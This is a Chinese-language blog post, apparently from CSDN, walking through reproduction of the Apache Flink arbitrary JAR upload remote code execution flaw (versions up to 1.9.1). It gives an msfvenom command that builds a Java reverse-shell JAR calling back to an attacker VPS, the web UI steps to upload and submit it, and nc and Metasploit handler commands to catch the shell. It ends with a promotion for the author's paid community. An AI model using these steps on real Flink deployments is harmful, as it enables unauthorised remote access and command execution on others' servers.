**目录**

[Apache Flink](#t0 "Apache Flink")

[漏洞描述](#t1 "漏洞描述")

[漏洞复现](#t2 "漏洞复现")

* * *

Apache Flink
------------

**Apache Flink**是由[Apache软件基金会](https://baike.baidu.com/item/Apache%E8%BD%AF%E4%BB%B6%E5%9F%BA%E9%87%91%E4%BC%9A/2912769 "Apache软件基金会")开发的开源流处理[框架](https://so.csdn.net/so/search?q=%E6%A1%86%E6%9E%B6&spm=1001.2101.3001.7020)，其核心是用Java和Scala编写的分布式流数据流引擎。Flink以数据并行和流水线方式执行任意流数据程序，Flink的流水线运行时系统可以执行批处理和流处理程序。此外，Flink的运行时本身也支持迭代算法的执行

### 漏洞描述

近日,有安全研究员公开了一个[Apache](https://so.csdn.net/so/search?q=Apache&spm=1001.2101.3001.7020) Flink的任意Jar包上传导致远程代码执行的漏洞，通过该漏洞，攻击者可以在后台上传jar包导致命令执行。.  
影响范围：<= 1.9.1

### 漏洞复现

先使用如下命令生成恶意jar包

```
msfvenom -p java/shell_reverse_tcp LHOST=VPS的ip地址 LPORT=34567 -f jar > test.jar
```


![](https://img-blog.csdnimg.cn/20201027082743482.png)

在Apache Flink后台点击如下

![](https://img-blog.csdnimg.cn/20201027083052287.png)

![](https://img-blog.csdnimg.cn/20201027083139570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

点击Submit

![](https://img-blog.csdnimg.cn/20201027083214444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我们这边nc就可以收到shell了

![](https://img-blog.csdnimg.cn/20201027083324775.png)

或者使用MSF监听

```
use exploit/multi/handler      
set payload java/meterpreter/reverse_tcp      
set lhost 0.0.0.0      
set lport xx      
run
```


![](https://img-blog.csdnimg.cn/20201027124837608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)